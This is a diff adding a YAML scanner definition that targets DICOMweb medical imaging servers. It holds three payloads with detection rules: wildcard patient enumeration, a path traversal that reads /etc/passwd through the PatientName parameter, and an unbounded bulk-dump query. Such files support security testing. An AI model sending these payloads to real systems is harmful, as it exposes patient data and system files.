@@ -1,0 +1,27 @@
+id: medical-dicom
+name: Medical — DICOM web injection
+context:
+  technologies: ["DICOM", "PACS", "Orthanc", "dcm4chee"]
+  paths: ["/dicom-web", "/wado-rs", "/qido-rs", "/stow-rs"]
+
+payloads:
+  - value: "/studies?PatientID=*"
+    detect: { body_contains: "00080020" }
+    id: med-dicom-enum-01
+    title: "DICOM — patient study enumeration (wildcard search)"
+    severity: critical
+    cwe: CWE-200
+
+  - value: "/studies?PatientName=../../../../etc/passwd"
+    detect: { body_regex: "root:.*:0:0" }
+    id: med-dicom-lfi-01
+    title: "DICOM — path traversal via PatientName parameter"
+    severity: critical
+    cwe: CWE-22
+
+  - value: "/studies?limit=999999&offset=0"
+    detect: { body_contains: "00080020" }
+    id: med-dicom-dump-01
+    title: "DICOM — mass data exfiltration (unbounded query)"
+    severity: high
+    cwe: CWE-770
